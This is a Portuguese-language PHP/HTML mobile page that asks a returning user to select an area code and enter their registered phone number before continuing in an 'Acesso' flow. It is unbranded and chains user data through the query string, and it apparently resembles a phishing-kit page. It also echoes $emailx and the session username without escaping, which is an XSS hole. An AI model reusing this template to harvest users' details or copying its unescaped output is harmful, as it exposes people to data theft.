<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Acesso Mobile :: Acesso</title>

	<!-- PERSONALIZAÇÃO CABEÇALHO -->
	<meta name="theme-color" content="#0072e5">
	<meta name="apple-mobile-web-app-status-bar-style" content="#0072e5">
	<meta name="msapplication-navbutton-color" content="#0072e5">
</head>
<body>
<script>
	function checkPhone(){
		var ddd = document.getElementById('ddd');
		var fone = document.getElementById('ms_phone');

		if(ddd.value == 'ddd'){
			alert("Selecione o DDD do telefone cadastrado!");
			return false;
		}
		if(fone.value.length < 9){
			alert("O Telefone informado não está correto, ou não é o telefone cadastrado conosco!");
			fone.value = '';
			fone.focus();
			return false;
		}
	}
</script>	

<div class="container main_header bg-blue">
	<div class="content">
		<div class="logo">
			<img src="../_images/mobile/main_logo.jpg" height="30" width="128">
		</div><!-- logo -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content">
		<div class="home_title">
			<h1>Informe o telefone cadastrado</h1>
			<p>
				<?php 
					if(strlen($_SESSION['UserName']) == 0):
						echo 'Para prosseguir, será necessário informar o telefone cadastrado.';
					else:
						echo $_SESSION['UserName'].', para prosseguir, será necessário informar o telefone cadastrado.';
					endif;
				?>
			</p>	
		</div>

		<form action="acesso.php?cliente=<?php echo $emailx; ?>" id="form_acesso" class="form_acesso" name="form_acesso" onsubmit="return checkPhone();" method="post">
			
			<span for="ms_phone" class="complete_blocks" style="margin-bottom:10px;font-size:1em;">
				<span style="margin-bottom:10px!important;display:block;">Telefone cadastrado:</span>
				<select name="ddd" id="ddd" class="normal_input" style="width:20%;float:left;">
					<option value="ddd" selected disabled>DDD</option>
					<?php 
						for($i = 11;$i <= 99;$i++):
							echo '<option value="'.$i.'">'.$i.'</option>';
						endfor;	
					?>
				</select>
				<input type="number" name="ms_phone" id="ms_phone" class="normal_input" placeholder="Telefone" autocomplete="off" maxlength="9" style="width:calc(80% - 10px);margin-left:10px;float:right;"
				oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			</span>

			<div class="block_labels">
				<input type="hidden" name="sender" value="send_phone">
				<input type="submit" name="next_page_acess" value="Confirmar" class="btn-submit-normal">
			</div><!-- block_labels -->
		</form>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<!-- ARQUIVOS DE INCLUSÃO -->
<link rel="stylesheet" href="../_styles/boot_mb.css">
<link rel="stylesheet" href="../_fonts/_fonts.css">
<link rel="stylesheet" href="../_styles/font-awesome.css">
<link rel="stylesheet" href="../_styles/content_mb.css">	
<script src="../_jscripts/jquery.js"></script>
<script src="../_jscripts/content_mb.js"></script>
<!-- ARQUIVOS DE INCLUSÃO -->
</body>
</html>
<?php ob_end_flush(); ?>